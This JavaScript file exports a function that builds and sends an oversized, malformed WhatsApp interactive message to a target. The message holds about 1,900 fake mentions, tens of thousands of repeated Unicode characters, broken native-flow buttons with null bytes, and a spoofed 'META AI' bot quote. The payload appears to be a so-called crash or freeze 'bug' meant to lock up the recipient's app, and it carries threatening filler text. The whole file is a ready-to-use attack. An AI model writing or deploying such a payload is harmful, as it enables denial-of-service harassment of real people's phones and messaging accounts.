async function xUi(sock, target) {
const Interactive = {
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
remoteJid: "X",
stanzaId: "123",
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 1900 }, () =>
"1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
),
],
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000,
},
forwardedAiBotMessageInfo: {
botName: "META AI",
botJid:
Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
creatorName: "Bot",
},
},
},
body: {
text:
" #4izxvelzExerct1st. " +
"ꦽ".repeat(50000) +
"ꦾ".repeat(50000),
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(10000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`,
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "REVIEW",
flow_cta: "\0",
flow_message_version: "3",
}),
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Null ${"𑲭𑲭".repeat(10000)}`,
url: "https://Wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://Wa.me/stickerpack/4izxvelzexect",
}),
},
{
name: "cta_app_link",
buttonParamsJson: JSON.stringify({
display_text: `4izxvelzExerc1st. ${"ꦽ".repeat(10000)}`,
android_app_metadata: {
url: "https://Wa.me/stickerpack/4izxvelzexect",
consented_users_url: "https://t.me/rizxvelzexct",
},
}),
},
{
name: "galaxy_message",
buttonParamsJson:
"{\"flow_message_version\":\"3\",\"flow_token\":\"unused\",\"flow_id\":\"1775342589999842\",\"flow_cta\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"AWARD_CLAIM\",\"data\":{\"error_types\":[],\"campaigns\":[],\"categories\":[{\"id\":\"category_1\",\"title\":\"Unicam\"},{\"id\":\"category_2\",\"title\":\"Constantes\"},{\"id\":\"category_3\",\"title\":\"Referidos\",\"on-unselect-action\":{\"name\":\"update_data\",\"payload\":{\"subcategory_visibility\":false}},\"on-select-action\":{\"name\":\"update_data\",\"payload\":{\"subcategories\":[{\"id\":\"1\",\"title\":\"1 subcategory\"},{\"id\":\"2\",\"title\":\"2 subcategory\"}],\"subcategory_visibility\":true}}}],\"subcategory_visibility\":false}},\"flow_metadata\":{\"flow_json_version\":1000,\"data_api_protocol\":\"I'm dying and bleeding of my past\",\"data_api_version\":9999999,\"flow_name\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"categories\":[]},\"icon\":\"REVIEW\",\"has_multiple_buttons\":true}"
},
],
messageParamsJson: "{}",
},
},
},
},
};

await sock.relayMessage(target, Interactive, {
messageId: null,
userJid: target,
});
}

export { xUi };